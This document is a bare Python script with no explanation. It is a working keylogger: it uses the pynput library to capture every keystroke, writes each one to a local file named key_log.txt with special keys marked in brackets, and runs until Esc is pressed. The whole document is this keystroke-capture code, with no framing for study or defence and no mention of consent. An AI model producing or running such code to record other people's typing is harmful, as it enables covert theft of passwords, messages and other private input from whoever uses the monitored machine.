import pynput
from pynput.keyboard import Key, Listener

log_file = "key_log.txt"

def log_keystroke(key):
    try:
        with open(log_file, "a") as f:
            f.write(str(key.char))
    except AttributeError:
        with open(log_file, "a") as f:
            if key == Key.space:
                f.write(" ")
            elif key == Key.enter:
                f.write("\n")
            elif key == Key.tab:
                f.write("\t")
            else:
                f.write(f" [{str(key)}] ")

def stop_listener(key):
    if key == Key.esc:
        return False

with Listener(on_press=log_keystroke, on_release=stop_listener) as listener:
    listener.join()

